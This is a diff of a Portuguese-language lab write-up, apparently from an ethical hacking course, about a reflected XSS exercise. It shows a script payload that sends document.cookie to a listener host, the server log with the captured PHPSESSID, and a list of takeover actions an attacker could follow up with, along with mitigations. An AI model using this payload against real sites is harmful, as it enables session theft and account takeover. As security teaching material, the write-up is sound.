@@ -92,6 +92,8 @@ Ele inicia
 
 `<script>document.write('<img src="http://192.168.1.10:8000/' + document.cookie + ' ">');</script>`
 
+![Comando](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0b13b93bd820eccdb2d8793901ef41e1979811a3/7%20-%20websites/xss_09.png)
+
 Esse snippet tenta exfiltrar cookies via uma requisição de imagem — um padrão clássico usado em XSS.
 
 **Explicação do script**
@@ -113,13 +115,37 @@ Esse snippet tenta exfiltrar cookies via uma requisição de imagem — um padr�
 - Evite document.write e “sinks” inseguros (innerHTML, etc.) com dados não confiáveis.
 
 **3.** Resultado
+Na página:
+
+![Resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/0b13b93bd820eccdb2d8793901ef41e1979811a3/7%20-%20websites/xss_10.png)
+
+*Tenta carregar uma imagem (sem sucesso)*
+
+No terminal:
 ```
 $ python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 192.168.1.10 - - [12/Sep/2025 22:49:41] code 404, message File not found
 192.168.1.10 - - [12/Sep/2025 22:49:41] "GET /security=medium;%20PHPSESSID=ccfafaeac102b3811d58970bd22e889c HTTP/1.1" 404 -
 ```
-É obtido o ID da sessão do usuário!
+É obtido um `PHPSESSID` válido da sessão do usuário! Quem o obtém costuma poder **assumir a identidade do usuário** na aplicação até a sessão expirar ou ser invalidada.
+
+### O que o atacante pode fazer
+
+* **Sequestrar a sessão (session hijacking):** enviar requisições ao site **com esse cookie** e agir como você (acessar dados, baixar relatórios, ver informações pessoais).
+* **Executar ações na conta:** mudar preferências, criar/excluir itens, iniciar transações, **gerar tokens API**, criar “chaves” ou integrações persistentes.
+* **Tomar a conta (ATO):** se o app permitir, **alterar e-mail/senha**, configurar autenticação alternativa, cadastrar fator 2FA próprio, gerar códigos de recuperação — e manter acesso mesmo após você sair.
+* **Pular 2FA no login:** 2FA protege a **entrada**; com a sessão já autenticada, o atacante **já está dentro**. (Reautenticação pontual para ações sensíveis pode mitigar.)
+* **Sessão de administrador:** se o cookie for de um usuário admin, impacto é maior (criação de usuários, alterar permissões, vazar base de dados, etc.).
+
+### Limitação do abuso
+
+* **Expiração / invalidação do servidor:** sessões curtas, logout que **mata a sessão no servidor**, rotação de ID em login/elevação de privilégio.
+* **Vinculação fraca de contexto:** alguns apps comparam **IP/UA**; isso reduz, mas não elimina (móveis/CGNAT/Proxies mudam IP; UA é fácil de imitar).
+* **Sessão já expirada / regenerada:** se o app **regenera o ID** ao logar ou ao mudar de papel, um `PHPSESSID` antigo perde valor.
+* **Controles de ação sensível:** pedir **senha/2FA** de novo para trocar e-mail, gerar token, excluir conta, etc.
+
+> Observação: flags **HttpOnly**, **Secure** e **SameSite** ajudam a **evitar o roubo**, mas **não** impedem o uso **depois que o cookie já foi obtido**. Um invasor pode simplesmente enviar o cookie em requisições HTTPS ao site legítimo.
 
 ## XSS Stored
 
